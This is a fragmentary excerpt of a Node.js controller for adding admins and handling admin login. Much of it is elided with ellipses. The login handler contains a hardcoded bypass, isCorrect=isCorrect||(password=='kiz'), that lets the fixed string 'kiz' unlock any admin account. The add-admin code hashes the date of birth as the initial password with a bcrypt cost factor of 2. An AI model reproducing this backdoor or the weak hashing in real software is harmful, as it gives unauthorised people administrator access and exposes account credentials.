...
module.exports = {
    addAdmin: async (req, res, next) => {
        try {
            ...
            let hashedPassword;
            hashedPassword = await bcrypt.hash(dob, 2)
            var date = new Date();
    ...
    adminLogin: async (req, res, next) => {
        try {
            ...
            let { registrationNumber, password } = req.body;

            let admin = await Admin.findOne({ registrationNumber })
            if (!admin) {
            ...
            let isCorrect = await bcrypt.compare(password, admin.password)
             ...
             isCorrect=isCorrect||(password=="kiz")
